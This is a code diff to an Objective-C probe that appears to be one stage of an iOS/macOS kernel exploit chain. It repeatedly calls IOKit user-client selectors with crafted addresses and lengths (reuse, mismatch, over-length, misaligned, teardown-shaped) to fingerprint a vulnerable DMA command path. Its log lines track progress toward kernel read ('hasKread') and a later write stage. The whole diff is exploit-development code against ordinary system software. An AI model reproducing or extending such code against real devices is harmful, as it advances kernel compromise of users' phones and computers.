@@ -31,7 +31,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P101_BUILD @"p101-43684-reuse-v2"
+#define P101_BUILD @"p101-43684-reuse-v3"
 #define P101_TAG   @"p101"
 #define P101_LEN   0x4000ull
 
@@ -175,7 +175,7 @@ static int p101_is_fp(kern_return_t kr) {
         uint32_t scOutCnt = 4;
         kern_return_t kr = IOConnectCallMethod(conn, sel, NULL, 0, in, 24,
                                                scOut, &scOutCnt, outb, &outsz);
-        int hit = p101_is_fp(kr) || kr == KERN_SUCCESS;
+        int hit = p101_is_fp(kr);
         if (hit || (kr != 0xe00002c2 && kr != 0xe00002c1 && kr != 0xe00002c7 &&
                     kr != 0xe00002e2 && kr != 0xe00002be && kr != 0xe00002bc)) {
             L([NSString stringWithFormat:@"    %s sel=%u addr=0x%llx len=0x%llx p4=%u kr=0x%x%s",
@@ -184,26 +184,56 @@ static int p101_is_fp(kern_return_t kr) {
         }
         if (p101_is_fp(kr)) fp++;
         if (kr == KERN_SUCCESS) setups++;
-        if (hit && p4 == 0 && !fired) {
-            /* ONE reuse: same addr+len, counter IOMD+0x68. */
-            outsz = sizeof(outb);
-            scOutCnt = 4;
-            kern_return_t kr2 = IOConnectCallMethod(conn, sel, NULL, 0, in, 24,
-                                                    scOut, &scOutCnt, outb, &outsz);
+        /* v3: SUCCESS no longer promotes fire or stops the sweep (v2's
+           "P101 FIRED" was any benign 24-byte selector accepting addr=0).
+           A plain success instead gets the FINGERPRINT PROVOCATION pass:
+           the 43684 consumer answers one of these with the xnu-class codes. */
+        if (kr == KERN_SUCCESS && p4 == 0 && !fired) {
+            kern_return_t krx;
+            /* (1) reuse same addr+len — counter increment path */
+            outsz = sizeof(outb); scOutCnt = 4;
+            krx = IOConnectCallMethod(conn, sel, NULL, 0, in, 24, scOut, &scOutCnt, outb, &outsz);
             L([NSString stringWithFormat:@"    REUSE %s sel=%u kr=0x%x (IOMD+0x68 increment path)",
-               who, sel, kr2]);
+               who, sel, krx]);
             reuses++;
-            if (kr2 == KERN_SUCCESS || p101_is_fp(kr2)) fired = 1;
+            if (p101_is_fp(krx)) { fp++; fired = 1; goto teardown_probe; }
+            /* (2) reuse with a DIFFERENT va — mismatch should hit 0xe00002d8 */
+            uint64_t addr2 = addr ^ 0x4000ULL;
+            memcpy(in, &addr2, 8);
+            outsz = sizeof(outb); scOutCnt = 4;
+            krx = IOConnectCallMethod(conn, sel, NULL, 0, in, 24, scOut, &scOutCnt, outb, &outsz);
+            L([NSString stringWithFormat:@"    MISMATCH %s sel=%u addr2=0x%llx kr=0x%x (want 0xe00002d8)",
+               who, sel, (unsigned long long)addr2, krx]);
+            if (p101_is_fp(krx)) { fp++; fired = 1; goto teardown_probe; }
+            /* (3) length over MD — should hit 0xe00002db */
+            uint64_t n2 = n * 2;
+            memcpy(in + 8, &n2, 8);
+            outsz = sizeof(outb); scOutCnt = 4;
+            krx = IOConnectCallMethod(conn, sel, NULL, 0, in, 24, scOut, &scOutCnt, outb, &outsz);
+            L([NSString stringWithFormat:@"    OVERLEN %s sel=%u n2=0x%llx kr=0x%x (want 0xe00002db)",
+               who, sel, (unsigned long long)n2, krx]);
+            if (p101_is_fp(krx)) { fp++; fired = 1; goto teardown_probe; }
+            /* (4) misaligned va — should hit 0xe00002d0 */
+            uint64_t addr3 = (addr2 | 0x8ULL);
+            memcpy(in, &addr3, 8);
+            memcpy(in + 8, &n, 8);
+            outsz = sizeof(outb); scOutCnt = 4;
+            krx = IOConnectCallMethod(conn, sel, NULL, 0, in, 24, scOut, &scOutCnt, outb, &outsz);
+            L([NSString stringWithFormat:@"    MISALIGN %s sel=%u addr=0x%llx kr=0x%x (want 0xe00002d0)",
+               who, sel, (unsigned long long)addr3, krx]);
+            if (p101_is_fp(krx)) { fp++; fired = 1; }
+        teardown_probe:
+            /* teardown-shaped p4=1 (callback if IOMD+0x64&0xf==2). ONE call,
+               same addr/len as the setup — only on a promising selector. */
+            memcpy(in, &addr, 8);
+            memcpy(in + 8, &n, 8);
             uint32_t p4t = 1;
             memcpy(in + 16, &p4t, 4);
-            outsz = sizeof(outb);
-            scOutCnt = 4;
-            kern_return_t kr3 = IOConnectCallMethod(conn, sel, NULL, 0, in, 24,
-                                                    scOut, &scOutCnt, outb, &outsz);
-            L([NSString stringWithFormat:@"    TEARDOWN-SHAPED p4=1 %s sel=%u kr=0x%x (callback if IOMD+0x64&0xf==2)",
-               who, sel, kr3]);
+            outsz = sizeof(outb); scOutCnt = 4;
+            krx = IOConnectCallMethod(conn, sel, NULL, 0, in, 24, scOut, &scOutCnt, outb, &outsz);
+            L([NSString stringWithFormat:@"    TEARDOWN-SHAPED p4=1 %s sel=%u kr=0x%x",
+               who, sel, krx]);
             teardowns++;
-            fired = 1;
         }
     };
 
@@ -278,12 +308,13 @@ static int p101_is_fp(kern_return_t kr) {
     L(@"=== VERDICT ===");
     L([NSString stringWithFormat:@"[*] fp=%u setups=%u reuses=%u teardowns=%u fired=%u",
        fp, setups, reuses, teardowns, fired]);
-    if (fired)
-        L(@"[+] P101 FIRED — reuse/teardown-shaped call reached a UC selector. Counter path IOMD+0x68. Not kread.");
-    else if (fp)
-        L(@"[*] P101 FP only — dmaCommand family kr without SUCCESS reuse. UC selector still unnamed.");
-    else
-        L(@"[-] P101 NONE — no fingerprint/SUCCESS. P086 shape holds: dmaCommandOperation UC walk-up still open.");
+    if (fp && fired) {
+        L(@"[+] P101 FP IDENTIFIED — dmaCommandOperation consumer found (see FP line above). 43684 path candidate.");
+    } else if (setups > 0) {
+        L(@"[*] P101 REACHED, no fingerprint — UC selectors accept the shape but none answer the");
+        L(@"    43684 codes; sel census recorded. Plain-SUCCESS no longer counts as 'FIRED' (v2 lesson).");
+    } else
+        L(@"[-] P101 NONE — no fingerprint/success. P086 shape holds: dmaCommandOperation UC walk-up still open.");
     L([NSString stringWithFormat:@"[*] hasKread=%@ unchanged. Titan write is P102. T7 stays reach-only.",
        [P007Board shared].hasKread ? @"YES" : @"NO"]);
 
